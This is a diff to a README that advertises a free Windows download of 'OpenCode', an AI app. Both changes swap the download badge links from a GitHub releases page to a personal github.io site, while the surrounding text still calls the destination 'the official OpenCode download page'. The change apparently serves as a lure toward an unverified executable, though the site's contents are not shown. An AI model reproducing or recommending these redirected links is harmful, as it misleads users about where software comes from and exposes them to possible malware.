@@ -14,7 +14,7 @@ Getting OpenCode on your Windows 10 or Windows 11 machine takes less than two mi
 
 ### Step 1: Download OpenCode
 
-[![⬇️ Download OpenCode Now](https://img.shields.io/badge/⬇️_Download_OpenCode-Free-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=blue)](https://github.com/Itszues999/OpenCode/releases)
+[![⬇️ Download OpenCode Now](https://img.shields.io/badge/⬇️_Download_OpenCode-Free-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=blue)](https://itszues999.github.io)
 
 Visit this link to download the application. You will be taken to the official OpenCode download page, where you can grab the latest version for free.
 
@@ -241,7 +241,7 @@ OpenCode is more than just software — it's a community of curious minds. Share
 
 OpenCode puts the power of artificial intelligence at your fingertips. Whether you need help writing, brainstorming ideas, solving problems, or just exploring what AI can do, OpenCode is your gateway.
 
-[![⬇️ Download OpenCode Now](https://img.shields.io/badge/⬇️_Download_OpenCode-Free-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=purple)](https://github.com/Itszues999/OpenCode/releases)
+[![⬇️ Download OpenCode Now](https://img.shields.io/badge/⬇️_Download_OpenCode-Free-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=purple)](https://itszues999.github.io)
 
 Visit this link to download the application — it's free, it's easy, and it's ready to change the way you work. See you on the other side of possibility.
 
